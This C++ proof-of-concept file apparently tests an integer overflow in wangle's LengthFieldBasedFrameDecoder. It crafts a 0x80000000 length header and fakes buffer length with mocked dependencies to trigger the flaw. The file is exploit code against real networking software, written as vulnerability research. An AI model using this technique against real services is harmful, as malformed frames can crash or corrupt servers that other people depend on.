
// PoC: WangleDecoderExploit.cpp
// Using mocked folly/wangle deps to verify logic flow in LengthFieldBasedFrameDecoder.cpp

#include <wangle/codec/LengthFieldBasedFrameDecoder.h>
#include <iostream>
#include <vector>
#include <memory>
#include <cstring>

using namespace wangle;
using namespace folly;

// Mock Context
class MockContext : public HandlerContext<IOBufQueue&, std::unique_ptr<IOBuf>> {
public:
    void fireRead(std::unique_ptr<IOBuf> msg) override {
        std::cout << "[*] Decode success. Payload size: " << msg->length() << std::endl;
    }
    void fireReadException(folly::exception_wrapper e) override {
        std::cout << "[-] fireReadException called." << std::endl;
    }
};

int main() {
    std::cout << "[*] Starting Wangle Decoder Integer Overflow Test..." << std::endl;

    // 1. Setup Vulnerable Configuration
    // Max frame length = 4GB - 16 (allow large frames)
    // Length Field = 4 bytes
    // InitialBytesToStrip = 0
    uint32_t maxFrame = 0xFFFFFFF0;
    LengthFieldBasedFrameDecoder decoder(4, maxFrame, 0, 0, 0, true);

    MockContext ctx;
    IOBufQueue queue;

    // 2. Craft Malicious Packet
    // We want frameLength to be > 2GB (INT_MAX) so casting to int becomes negative.
    // e.g. 0x80000000 (2147483648)
    // frameLength will be 2147483648.
    // actualFrameLength = static_cast<int>(2147483648) = -2147483648

    // Header (Big Endian)
    // 0x80000000
    auto header = IOBuf::create(4);
    header->writableData()[0] = 0x80;
    header->writableData()[1] = 0x00;
    header->writableData()[2] = 0x00;
    header->writableData()[3] = 0x00;

    queue.append(std::move(header));

    // 3. Fake the data presence
    // We set virtual length to cover the 2GB+ requirement so chainLength() check passes.
    // The decoder checks: if (buf.chainLength() < frameLength)
    // frameLength is 2147483648.
    // We need chainLength >= 2147483648.
    // Header is 4 bytes. Virtual need 2147483644.
    queue.setVirtualLength(2147483650UL);

    std::unique_ptr<IOBuf> result;
    size_t needed = 0;

    std::cout << "[*] Triggering decode..." << std::endl;
    try {
        decoder.decode(&ctx, queue, result, needed);
    } catch (const std::exception& e) {
        std::cout << "[-] Exception caught in main: " << e.what() << std::endl;
    }

    std::cout << "[-] Test finished without detecting overflow (maybe fixed?)." << std::endl;
    return 0;
}
